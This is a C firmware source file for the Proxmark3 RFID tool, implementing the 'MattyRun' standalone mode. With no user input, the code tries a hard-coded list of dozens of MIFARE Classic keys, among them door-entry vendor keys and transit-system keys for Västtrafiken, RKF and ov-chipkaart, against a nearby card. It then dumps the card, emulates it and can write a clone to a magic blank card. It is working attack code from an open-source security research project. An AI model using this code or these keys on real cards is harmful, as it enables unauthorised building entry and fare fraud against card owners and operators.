//-----------------------------------------------------------------------------
// Copyright (C) Matías A. Ré Medina 2016
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// main code for HF aka MattyRun by Matías A. Ré Medina
//-----------------------------------------------------------------------------
/*
### What I did:
I've personally recoded the image of the ARM in order to automate
the attack and simulation on Mifare cards. I've moved some of the
implementation on the client side to the ARM such as *chk*, *mattyrun_ecfill*, *sim*
and *clone* commands.

### What it does now:
It will check if the keys from the attacked tag are a subset from
the hardcoded set of keys inside of the FPGA. If this is the case
then it will load the keys into the emulator memory and also the
content of the victim tag, to finally simulate it and make a clone
on a blank card.

#### TODO:
- Nested attack in the case not all keys are known.
- Dump into magic card in case of needed replication.

#### ~ Basically automates commands without user intervention.
#### ~ No need of interface.
#### ~ Just a portable battery or an OTG usb cable for power supply.

## Spanish full description of the project [here](http://bit.ly/2c9nZXR).
*/

#include "standalone.h" // standalone definitions
#include "proxmark3_arm.h"
#include "appmain.h"
#include "fpgaloader.h"
#include "util.h"
#include "dbprint.h"
#include "ticks.h"
#include "string.h"
#include "commonutil.h"
#include "iso14443a.h"
#include "mifarecmd.h"
#include "crc16.h"
#include "BigBuf.h"
#include "mifaresim.h"  // mifare1ksim
#include "mifareutil.h"

static uint8_t mattyrun_uid[10];
static uint32_t mattyrun_cuid;
static iso14a_card_select_t mattyrun_p_card;

// Pseudo-configuration block.
static bool mattyrun_printKeys = false;         // Prints keys
//static bool transferToEml = true;      // Transfer keys to emulator memory
static bool mattyrun_ecfill = true;             // Fill emulator memory with cards content.
//static bool simulation = true;         // Simulates an exact copy of the target tag
static bool mattyrun_fillFromEmulator = false;  // Dump emulator memory.

//-----------------------------------------------------------------------------
// Matt's StandAlone mod.
// Work with "magic Chinese" card (email him: ouyangweidaxian@live.cn)
//-----------------------------------------------------------------------------
static int saMifareCSetBlock(uint32_t arg0, uint32_t arg1, uint32_t arg2, uint8_t *datain) {
    // params
    uint8_t needWipe = arg0;
    // bit 0 - need get UID
    // bit 1 - need wupC
    // bit 2 - need HALT after sequence
    // bit 3 - need init FPGA and field before sequence
    // bit 4 - need reset FPGA and LED
    uint8_t workFlags = arg1;
    uint8_t blockNo = arg2;

    // card commands
    uint8_t wupC1[] = {0x40};
    uint8_t wupC2[] = {0x43};
    uint8_t wipeC[] = {0x41};

    // variables
    uint8_t isOK = 0;
    uint8_t d_block[18] = {0x00};

    uint8_t receivedAnswer[MAX_MIFARE_FRAME_SIZE];
    uint8_t receivedAnswerPar[MAX_MIFARE_PARITY_SIZE];

    // reset FPGA and LED
    if (workFlags & 0x08) {
        iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
        set_tracing(false);
    }

    while (true) {
        // get UID from chip
        if (workFlags & 0x01) {
            if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
                DbprintfEx(FLAG_NEWLINE, "Can't select card");
                break;
            };

            if (mifare_classic_halt(NULL)) {
                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        };

        // reset chip
        if (needWipe) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC1 error");
                break;
            };

            ReaderTransmit(wipeC, sizeof(wipeC), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wipeC error");
                break;
            };

            if (mifare_classic_halt(NULL)) {
                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        };

        // chaud
        // write block
        if (workFlags & 0x02) {
            ReaderTransmitBitsPar(wupC1, 7, 0, NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC1 error");
                break;
            };

            ReaderTransmit(wupC2, sizeof(wupC2), NULL);
            if (!ReaderReceive(receivedAnswer, receivedAnswerPar) || (receivedAnswer[0] != 0x0a)) {
                DbprintfEx(FLAG_NEWLINE, "wupC2 errorv");
                break;
            };
        }

        if ((mifare_sendcmd_short(NULL, CRYPT_NONE, 0xA0, blockNo, receivedAnswer, receivedAnswerPar, NULL) != 1) || (receivedAnswer[0] != 0x0a)) {
            DbprintfEx(FLAG_NEWLINE, "write block send command error");
            break;
        };

        memcpy(d_block, datain, 16);
        AddCrc14A(d_block, 16);
        ReaderTransmit(d_block, sizeof(d_block), NULL);
        if ((ReaderReceive(receivedAnswer, receivedAnswerPar) != 1) || (receivedAnswer[0] != 0x0a)) {
            DbprintfEx(FLAG_NEWLINE, "write block send data error");
            break;
        };

        if (workFlags & 0x04) {
            if (mifare_classic_halt(NULL)) {
                DbprintfEx(FLAG_NEWLINE, "Halt error");
                break;
            };
        }

        isOK = 1;
        break;
    }

    if ((workFlags & 0x10) || (!isOK)) {
        FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    }

    return isOK;
}

/* the chk function is a piwi’ed(tm) check that will try all keys for
a particular sector. also no tracing no dbg */
static int saMifareChkKeys(uint8_t blockNo, uint8_t keyType, bool clearTrace,
                           uint8_t keyCount, uint8_t *datain, uint64_t *key) {
    g_dbglevel = DBG_NONE;
    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    set_tracing(false);

    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    int retval = -1;

    for (uint8_t i = 0; i < keyCount; i++) {

        /* no need for anticollision. just verify tag is still here */
        // if (!iso14443a_fast_select_card(cjuid, 0)) {
        if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
            DbprintfEx(FLAG_NEWLINE, "FATAL : E_MF_LOSTTAG");
            break;
        }

        uint64_t ui64Key = bytes_to_num(datain + i * 6, 6);
        if (mifare_classic_auth(pcs, mattyrun_cuid, blockNo, keyType, ui64Key, AUTH_FIRST)) {
            uint8_t dummy_answer = 0;
            ReaderTransmit(&dummy_answer, 1, NULL);
            // wait for the card to become ready again
            SpinDelayUs(AUTHENTICATION_TIMEOUT);
            continue;
        }
        *key = ui64Key;
        retval = i;
        break;
    }
    crypto1_deinit(pcs);
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    return retval;
}

/* Abusive microgain on original MifareECardLoad :
 * - *datain used as error return
 * - tracing is falsed
 */
static int saMifareECardLoad(uint32_t numofsectors, uint8_t keytype) {
    g_dbglevel = DBG_NONE;

    uint8_t numSectors = numofsectors;
    uint8_t keyType = keytype;

    struct Crypto1State mpcs = {0, 0};
    struct Crypto1State *pcs;
    pcs = &mpcs;

    uint8_t dataoutbuf[16];
    uint8_t dataoutbuf2[16];

    iso14443a_setup(FPGA_HF_ISO14443A_READER_LISTEN);
    clear_trace();
    set_tracing(false);

    int retval = PM3_SUCCESS;

    if (!iso14443a_select_card(mattyrun_uid, &mattyrun_p_card, &mattyrun_cuid, true, 0, true)) {
        retval = PM3_ESOFT;
        DbprintfEx(FLAG_RAWPRINT, "Can't select card");
        goto out;
    }

    for (uint8_t s = 0; s < numSectors; s++) {
        uint64_t ui64Key = emlGetKey(s, keyType);
        if (s == 0) {
            if (mifare_classic_auth(pcs, mattyrun_cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_FIRST)) {
                retval = PM3_ESOFT;
                break;
            }
        } else {
            if (mifare_classic_auth(pcs, mattyrun_cuid, FirstBlockOfSector(s), keyType, ui64Key, AUTH_NESTED)) {
                retval = PM3_ESOFT;
                break;
            }
        }

        // failure to read one block,  skips to next sector.
        for (uint8_t blockNo = 0; blockNo < NumBlocksPerSector(s); blockNo++) {
            if (mifare_classic_readblock(pcs, FirstBlockOfSector(s) + blockNo, dataoutbuf)) {
                retval = PM3_ESOFT;
                break;
            };

            if (blockNo < NumBlocksPerSector(s) - 1) {
                emlSetMem_xt(dataoutbuf, FirstBlockOfSector(s) + blockNo, 1, 16);
            } else {
                // sector trailer, keep the keys, set only the AC
                emlGetMem(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1);
                memcpy(&dataoutbuf2[6], &dataoutbuf[6], 4);
                emlSetMem_xt(dataoutbuf2, FirstBlockOfSector(s) + blockNo, 1, 16);
            }
        }
    }

    int res = mifare_classic_halt(pcs);
    (void)res;

out:
    crypto1_deinit(pcs);
    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    return retval;
}


void ModInfo(void) {
    DbpString("  HF Mifare sniff/clone - aka MattyRun (Matías A. Ré Medina)");
}

/*
    It will check if the keys from the attacked tag are a subset from
    the hardcoded set of keys inside of the ARM. If this is the case
    then it will load the keys into the emulator memory and also the
    content of the victim tag, to finally simulate it.

    Alternatively, it can be dumped into a blank card.

    This source code has been tested only in Mifare 1k.

    If you're using the proxmark connected to a device that has an OS, and you're not using the proxmark3 client to see the debug
    messages, you MUST uncomment usb_disable().
*/
void RunMod(void) {
    StandAloneMode();
    FpgaDownloadAndGo(FPGA_BITSTREAM_HF);
    Dbprintf(">>  Matty mifare chk/dump/sim  a.k.a MattyRun Started  <<");

    // Comment this line below if you want to see debug messages.
    // usb_disable();

    uint16_t mifare_size = 1024;    // Mifare 1k (only 1k supported for now)
    uint8_t sectorSize = 64;        // 1k's sector size is 64 bytes.
    uint8_t blockNo = 3;            // Security block is number 3 for each sector.
    uint8_t sectorsCnt = (mifare_size / sectorSize);
    uint64_t key64;                 // Defines current key
    uint8_t *keyBlock;              // Where the keys will be held in memory.
    bool keyFound = false;

    // Set of keys to be used.
    uint64_t mfKeys[] = {
        0xffffffffffff, // Default key
        0x000000000000, // Blank key
        0xa0a1a2a3a4a5, // NFCForum MAD key
        0xb0b1b2b3b4b5,
        0xaabbccddeeff,
        0x4d3a99c351dd,
        0x1a982c7e459a,
        0xd3f7d3f7d3f7,
        0x714c5c886e97,
        0x587ee5f9350f,
        0xa0478cc39091,
        0x533cb6c723f6,
        0x8fd0a4f256e9,
        0x484558414354, // INFINEONON A / 0F SEC B / INTRATONE / HEXACT...
        0x414c41524f4e, // ALARON NORALSY
        0x424c41524f4e, // BLARON NORALSY
        0x4a6352684677, // COMELIT A General Key  / 08 [2] 004
        0x536653644c65, // COMELIT B General Key  / 08 [2] 004
        0x8829da9daf76, // URMET CAPTIV IF A => ALL A/B / BTICINO
        0x314B49474956, // "1KIGIV" VIGIK'S SERVICE BADGE A KEY
        0x021209197591, // BTCINO UNDETERMINED SPREAKD 0x01->0x13 key
        0x010203040506, // VIGIK's B Derivative
        0xa22ae129c013, // INFINEON B 00
        0x49fae4e3849f, // INFINEON B 01
        0x38fcf33072e0, // INFINEON B 02
        0x8ad5517b4b18, // INFINEON B 03
        0x509359f131b1, // INFINEON B 04
        0x6c78928e1317, // INFINEON B 05
        0xaa0720018738, // INFINEON B 06
        0xa6cac2886412, // INFINEON B 07
        0x62d0c424ed8e, // INFINEON B 08
        0xe64a986a5d94, // INFINEON B 09
        0x8fa1d601d0a2, // INFINEON B 0A
        0x89347350bd36, // INFINEON B 0B
        0x66d2b7dc39ef, // INFINEON B 0C
        0x6bc1e1ae547d, // INFINEON B 0D
        0x22729a9bd40f,  // INFINEON B 0E
        0xd2ece8b9395e, // lib / Nat Bieb
        0x1494E81663D7, // # NSCP default key
        0x569369c5a0e5, // # kiev
        0x632193be1c3c, // # kiev
        0x644672bd4afe, // # kiev
        0x8fe644038790, // # kiev
        0x9de89e070277, // # kiev
        0xb5ff67cba951, // # kiev / ov-chipkaart
        0xeff603e1efe9, // # kiev
        0xf14ee7cae863, // # kiev
        0xfc00018778f7, // # Västtrafiken KeyA, RKF ÖstgötaTrafiken KeyA
        0x0297927c0f77, // # Västtrafiken KeyA
        0x54726176656c, // # Västtrafiken KeyA
        0x00000ffe2488, // # Västtrafiken KeyB
        0x776974687573, // # Västtrafiken KeyB
        0xee0042f88840, // # Västtrafiken KeyB
        0x26940b21ff5d, // # RKF SLKeyA
        0xa64598a77478, // # RKF SLKeyA
        0x5c598c9c58b5, // # RKF SLKeyB
        0xe4d2770a89be, // # RKF SLKeyB
        0x722bfcc5375f, // # RKF RejskortDanmark KeyA
        0xf1d83f964314, // # RKF RejskortDanmark KeyB
        0x505249564141, // # RKF JOJOPRIVAKeyA
        0x505249564142, // # RKF JOJOPRIVAKeyB
        0x47524f555041, // # RKF JOJOGROUPKeyA
        0x47524f555042, // # RKF JOJOGROUPKeyB
        0x434f4d4d4f41, // # RKF JOJOGROUPKeyA
        0x434f4d4d4f42, // # RKF JOJOGROUPKeyB
        0x4b0b20107ccb, // # TNP3xxx
    };

    /*
        This part allocates the byte representation of the
        keys in keyBlock's memory space .
    */
    keyBlock = BigBuf_malloc(ARRAYLEN(mfKeys) * 6);
    int mfKeysCnt = ARRAYLEN(mfKeys);

    for (int mfKeyCounter = 0; mfKeyCounter < mfKeysCnt; mfKeyCounter++) {
        num_to_bytes(mfKeys[mfKeyCounter], 6, (uint8_t *)(keyBlock + mfKeyCounter * 6));
    }

    // Pretty print of the keys to be checked.
    if (mattyrun_printKeys) {
        Dbprintf("[+] Printing mf keys");
        for (uint8_t keycnt = 0; keycnt < mfKeysCnt; keycnt++)
            Dbprintf("[-] chk mf key[%2d] %02x%02x%02x%02x%02x%02x", keycnt,
                     (keyBlock + 6 * keycnt)[0], (keyBlock + 6 * keycnt)[1], (keyBlock + 6 * keycnt)[2],
                     (keyBlock + 6 * keycnt)[3], (keyBlock + 6 * keycnt)[4], (keyBlock + 6 * keycnt)[5], 6);
        DbpString("--------------------------------------------------------");
    }

    /*
        Initialization of validKeys and foundKeys storages.
        - validKey will store whether the sector has a valid A/B key.
        - foundKey will store the found A/B key for each sector.
    */
    bool validKey[2][40];
    uint8_t foundKey[2][40][6];
    for (uint8_t i = 0; i < 2; i++) {
        for (uint16_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
            validKey[i][sectorNo] = false;
            foundKey[i][sectorNo][0] = 0xFF;
            foundKey[i][sectorNo][1] = 0xFF;
            foundKey[i][sectorNo][2] = 0xFF;
            foundKey[i][sectorNo][3] = 0xFF;
            foundKey[i][sectorNo][4] = 0xFF;
            foundKey[i][sectorNo][5] = 0xFF;
        }
    }

    // Iterates through each sector checking if there is a correct key.
    bool err = 0;
    bool allKeysFound = true;
    uint32_t size = mfKeysCnt;

    for (int type = 0; type < 2 && !err; type++) {
        int block = blockNo;
        for (int sec = 0; sec < sectorsCnt && !err; ++sec) {
            Dbprintf("\tCurrent sector:%3d, block:%3d, key type: %c, key count: %i ", sec, block, type ? 'B' : 'A', mfKeysCnt);
            int key = saMifareChkKeys(block, type, true, size, &keyBlock[0], &key64);
            if (key == -1) {
                LED(LED_RED, 50);
                Dbprintf("\t [✕] Key not found for this sector!");
                allKeysFound = false;
                // break;
            } else if (key == -2) {
                err = 1; // Can't select card.
                break;
            } else {
                num_to_bytes(key64, 6, foundKey[type][sec]);
                validKey[type][sec] = true;
                keyFound = true;
                Dbprintf("\t [✓] Found valid key: [%02x%02x%02x%02x%02x%02x]\n",
                         (keyBlock + 6 * key)[0], (keyBlock + 6 * key)[1], (keyBlock + 6 * key)[2],
                         (keyBlock + 6 * key)[3], (keyBlock + 6 * key)[4], (keyBlock + 6 * key)[5]
                        );
            }

            block < 127 ? (block += 4) : (block += 16);
        }
    }

    /*
        TODO:
        - Get UID from tag and set accordingly in emulator memory and call mifaresim with right flags (iceman)
    */
    if (allKeysFound) {
        Dbprintf("\t✓ All keys found");
    } else {
        if (keyFound) {
            Dbprintf("\t✕ There's currently no nested attack in MattyRun, sorry!");
            LED_C_ON(); //red
            LED_A_ON(); //yellow
            // no room to run nested attack on device (iceman)
            // Do nested attack, set allKeysFound = true;
            // allKeysFound = true;
        }   else {
            Dbprintf("\t✕ There's nothing I can do without at least a one valid key, sorry!");
            LED_C_ON(); //red
        }
    }

    // If enabled, transfers found keys to memory and loads target content in emulator memory. Then it simulates to be the tag it has basically cloned.

//    if ((transferToEml) && (allKeysFound)) {
    if (allKeysFound) {

        emlClearMem();

        uint8_t mblock[16];
        for (uint8_t sectorNo = 0; sectorNo < sectorsCnt; sectorNo++) {
            if (validKey[0][sectorNo] || validKey[1][sectorNo]) {

                emlGetMem(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1); // data, block num, blocks count (max 4)
                for (uint16_t t = 0; t < 2; t++) {
                    if (validKey[t][sectorNo]) {
                        memcpy(mblock + t * 10, foundKey[t][sectorNo], 6);
                    }
                }
                emlSetMem_xt(mblock, FirstBlockOfSector(sectorNo) + NumBlocksPerSector(sectorNo) - 1, 1, 16);
            }
        }

        Dbprintf("\t [✓] Found keys have been transferred to the emulator memory.");

        if (mattyrun_ecfill) {
            int filled;
            Dbprintf("\tFilling in with key A.");

            filled = saMifareECardLoad(sectorsCnt, 0);
            if (filled != PM3_SUCCESS) {

                Dbprintf("\t [✕] Failed filling with A.");
                Dbprintf("\tFilling in with key B.");
                filled = saMifareECardLoad(sectorsCnt, 1);
                if (filled != PM3_SUCCESS) {
                    Dbprintf("\t [✕] Failed filling with B.");
                }
            }

//            if ((filled == PM3_SUCCESS) && simulation) {
            if (filled == PM3_SUCCESS) {
                Dbprintf("\t [✓] Emulator memory filled, simulation started.");

                // This will tell the fpga to emulate using previous keys and current target tag content.
                Dbprintf("\t Press button to abort simulation at anytime.");

                LED_B_ON(); // green

                uint16_t simflags = FLAG_UID_IN_EMUL | FLAG_MF_1K;

                SpinOff(1000);
                Mifare1ksim(simflags, 0, mattyrun_uid, 0, 0);
                LED_B_OFF();
                Dbprintf("\t [✓] Simulation ended");

                // Needs further testing.
                if (mattyrun_fillFromEmulator) {
                    uint8_t retry = 5;
                    Dbprintf("\t Trying to dump into blank card.");
                    int flags = 0;
                    LED_A_ON(); //yellow
                    for (int blockNum = 0; blockNum < 16 * 4; blockNum += 1) {
                        uint8_t cnt = 0;
                        emlGetMem(mblock, blockNum, 1);
                        // switch on field and send magic sequence
                        if (blockNum == 0) flags = 0x08 + 0x02;

                        // just write
                        if (blockNum == 1) flags = 0;

                        // Done. Magic Halt and switch off field.
                        if (blockNum == 16 * 4 - 1) flags = 0x04 + 0x10;

                        while (!saMifareCSetBlock(0, flags & 0xFE, blockNum, mblock) && cnt <= retry) {
                            cnt++;
                            Dbprintf("\t! Could not write block. Retrying.");
                        }
                        if (cnt == retry) {
                            Dbprintf("\t✕ Retries failed. Aborting.");
                            break;
                        }
                    }

                    if (!err) {
                        LED_B_ON();
                    } else {
                        LED_C_ON();
                    }

                }
            }

            if (filled != PM3_SUCCESS) {
                Dbprintf("\t [✕] Emulator memory could not be filled due to errors.");
                LED_C_ON();
            }
        }
    }
    LEDsoff();
}
